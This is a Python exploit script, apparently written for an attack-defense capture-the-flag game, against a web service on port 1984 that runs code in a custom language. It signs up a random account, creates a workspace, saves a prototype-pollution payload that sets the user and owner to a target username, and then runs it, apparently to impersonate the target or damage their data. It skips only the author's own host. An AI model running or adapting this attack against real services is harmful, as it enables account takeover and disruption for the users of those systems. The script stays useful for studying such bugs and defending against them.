#!/usr/bin/env python3
import re
import sys
import json
import requests
from random import choice
from string import ascii_letters, digits

MY_HOST = '10.80.1.2'

host = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
hint = json.loads(
    sys.argv[2]
    if len(sys.argv) > 2
    else '{"username":"vulnerable","workspace_id":"i2yy40zjs6qgitq"}'
)

URL = f'http://{host}:1984'

PAYLOAD = (
    'GUYS I CAN VOUCH __proto__ IS '
    '{{"user":{{"username":"{username}"}},"owner":{{"username":"{username}"}}}}'
)


def random_string(length: int = 16):
    return ''.join(choice(ascii_letters + digits) for _ in range(length))


def register(session: requests.Session):
    session.post(
        f'{URL}/auth/signup',
        data={
            'username': random_string(),
            'email': f'{random_string()}@mail.ru',
            'password': random_string(),
        },
    )
    token = session.cookies["pb_auth"]
    session.headers["Cookie"] = f"pb_auth={token}"


def get_workspace_id_from_link(link: str) -> str:
    workspace_id_match = re.search(r'/workspace/(?P<id>[a-z0-9]+)$', link)
    assert workspace_id_match is not None
    workspace_id = workspace_id_match.group('id')
    return workspace_id


def create_workspace(session: requests.Session) -> str:
    response = session.post(
        f'{URL}/playground?/createWorkspace',
        data={'name': random_string(), 'description': None},
    )
    redirect_location = response.json()["location"]
    return get_workspace_id_from_link(redirect_location)


def save_payload(session: requests.Session, workspace_id: str, username: str):
    session.put(
        f'{URL}/workspace/{workspace_id}/main.sus',
        json={
            'content': PAYLOAD.format(username=username),
        },
    )


def execute_payload(session: requests.Session, workspace_id: str) -> str:
    session.post(
        f'{URL}/workspace/{workspace_id}/main.sus',
        json={'stdin': ''},
    )


def main():
    if host == MY_HOST:
        # We don't want to dos ourselves :D
        return

    s = requests.Session()
    register(s)
    workspace_id = create_workspace(s)
    save_payload(s, workspace_id, hint['username'])
    execute_payload(s, workspace_id)


if __name__ == '__main__':
    main()
